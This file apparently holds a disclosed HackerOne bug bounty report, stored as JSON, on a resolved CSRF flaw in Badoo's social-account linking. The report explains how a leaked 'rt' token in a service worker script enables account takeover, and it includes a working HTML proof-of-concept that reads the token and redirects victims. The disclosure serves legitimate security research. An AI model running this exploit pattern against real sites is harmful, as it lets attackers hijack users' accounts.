@@ -1,0 +1,111 @@
+{
+  "id": 127703,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjc3MDM=",
+  "url": "https://hackerone.com/reports/127703",
+  "title": "[CRITICAL] Full account takeover using CSRF",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-02T00:21:41.032Z",
+  "submitted_at": "2016-04-02T00:21:41.032Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zombiehelp54",
+    "url": "/zombiehelp54",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mevfgipw1pc7n4wy86swdq1yaeuq/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21554,
+    "url": "https://hackerone.com/bumble",
+    "handle": "bumble",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/554/13fb93fae5496e8e259a0f2a2fba3a72ca10550b_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Bumble",
+      "twitter_handle": "bumble",
+      "website": "https://bumble.com/",
+      "about": "Bumble - Date, Meet, Network Better"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-04-12T19:18:20.454Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-04-12T17:47:05.550Z",
+  "team_member_agreed_on_going_public_at": "2016-04-12T19:18:20.397Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi , I have found a CSRF issue that allows an attacker to link his gmail , facebook ... or any social account to the victim's account and hijack the whole account.\n#Details:\nWhen a user tries to link a gmail account with his account , after he authorizes badoo to use his gmail account he will be redirected to `https://eu1.badoo.com/google/verify.phtml?rt=<State_param_value>&code=<Code_returned_from_google>` , the only thing that protects from CSRF is the `rt` parameter which is unique for each user/session . I have noticed that the `rt` parameter is returned on almost all json responses so I tried to find a link that leaks it. After digging for a while , I have found this link https://eu1.badoo.com/worker-scope/chrome-service-worker.js , and I was surprised that it contains the `rt` parameter value!! \nif you open the link `https://eu1.badoo.com/worker-scope/chrome-service-worker.js ` you'll find a string variable `url_stats` containing the value of the `rt` parameter:\n```javascript\nvar url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';\n```\nSo, now I got a javascript file with the `rt` param value and I can use it to link any malicious social media account with it. \n#Here is a PoC: \nHere is a live PoC: http://azzazpp.com/badoo.html which will link a dummy gmail account of mine to your badoo account. Go to https://eu1.badoo.com/settings then check your social accounts and you will see a gmail account with the name `Mahmoud Gamal` added to your social accounts.\n\n```\n<html>\n<head>\n<title>Badoo account take over</title>\n<script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>\n</head>\n<body>\n<script>\nfunction getCSRFcode(str) {\n    return str.split('=')[2];\n}\nwindow.onload = function(){\nvar csrf_code = getCSRFcode(url_stats);\ncsrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3yfn2SFUBear08KQaXo609JkArgoju1gZ6Pc&authuser=3&session_state=7cb85df679219ce71044666c7be3e037ff54b560..a810&prompt=none&rt='+ csrf_code;\nwindow.location = csrf_url;\n};\n</script>\n```\nAfter an attacker links his gmail , facebook or any social account to the victim's account , he can use it to login to the victim's account and do any modifications he wants.\nPlease tell me if you are having any problems reproducing this.\nThanks!",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-05-12T17:47:05.627Z",
+  "allow_singular_disclosure_after": -244750705.57444963,
+  "singular_disclosure_allowed": true,
+  "vote_count": 45,
+  "voters": [
+    "muslimfrompk",
+    "drsniper",
+    "p1stachios",
+    "spam404",
+    "pirneci",
+    "vipul_garg",
+    "0nlymohammed",
+    "yipman",
+    "vishalchauhan2212",
+    "varlynx",
+    "and 35 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
